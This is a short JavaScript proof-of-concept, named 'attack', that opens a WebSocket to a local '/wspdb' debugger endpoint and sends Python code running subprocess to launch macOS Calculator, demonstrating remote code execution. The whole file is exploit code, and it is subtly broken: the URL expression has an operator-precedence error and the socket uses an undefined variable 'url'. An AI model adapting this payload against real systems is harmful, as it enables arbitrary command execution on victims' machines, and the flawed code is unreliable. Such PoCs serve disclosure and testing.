function attack(headers, cookie, body) {
        let wsURL = "ws://" + location.hostname + ":" + location.port === 80 ? "80" : location.port +
            "/wspdb";

        const ws = new WebSocket(url);
        ws.onopen = () => ws.send(
            "import subprocess; subprocess.call([\"/usr/bin/open\", \"-W\", \"-n\", \"-a\", \"/Applications/Calculator.app\"])"
        );
        ws.onmessage = ({
            data
        }) => {
            console.log(data);
            ws.close();
        };
        ws.onerror = err => console.error('failed to connect');
    }